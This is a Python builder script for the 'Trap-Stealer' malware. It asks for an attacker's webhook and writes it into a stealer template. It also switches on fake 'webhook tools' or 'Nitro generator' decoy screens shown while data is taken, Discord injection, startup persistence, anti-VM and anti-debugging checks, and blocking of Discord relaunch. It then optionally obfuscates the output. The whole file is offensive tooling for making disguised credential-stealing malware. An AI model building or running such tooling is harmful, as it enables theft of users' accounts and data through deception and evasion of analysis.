import os, platform, subprocess, shutil
while True:
    os.makedirs('./Build', exist_ok=True)
    shutil.copy('Trap-Stl.py', './Build/Trap-Stl-Building.py')
    def clear_console():
        operating_system = platform.system()
        if operating_system == 'Windows':
            os.system('cls')  # For Windows
        else:
            os.system('clear')  # For Linux and macOS

    def get_boolean_input(prompt):
        while True:
            user_input = input(prompt).lower()
            if user_input in ['y', 'yes']:
                return True
            elif user_input in ['n', 'no']:
                return False
            else:
                print('Invalid input. Please enter Y or N.')


    # Read the contents of the source file with the appropriate encoding
    with open('Trap-Stl.py', 'r', encoding='utf-8', errors='replace') as file:
        content = file.read()
    Webhook = input('Enter the webhook -> ')
    FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
    FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
    Injection = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
    Startup = get_boolean_input('Do you want to add the file to the startup folder? Y/N: ')
    No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
    Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')


    new_content = content.replace("%Webhook%", Webhook)
    new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
    new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
    new_content = new_content.replace("'%Injection%'", str(Injection))
    new_content = new_content.replace("'%Startup%'", str(Startup))
    new_content = new_content.replace("'%No_Debug%'", str(No_Debug))
    new_content = new_content.replace("'%Close%'", str(Close))
    # Write the modified content to the new file
    with open('./Build/Trap-Stealer-Built.py', 'w', encoding='utf-8') as file:
        file.write(new_content)
    clear_console()
    print('Created [+]')


    Obfuscation = input('Do you want to obfuscate it? Y/N: ')
    Obfuscation = Obfuscation.lower()
    while True:
        if Obfuscation in ['y', 'yes']:
            strength = input('How strong do you want the obfuscation to be (Recommended: 100): ')
            subprocess.run(['python', 'Obfuscator.py', '-r', '-i', './Build/Trap-Stl-Building.py', '-o', './Build/Trap-Stl-Builted-Obf.py', '-s', strength])
            break
        elif Obfuscation in ['n', 'no']:
            break
        else:
            print('Invalid input. Please enter Y or N.')
            
    exit()
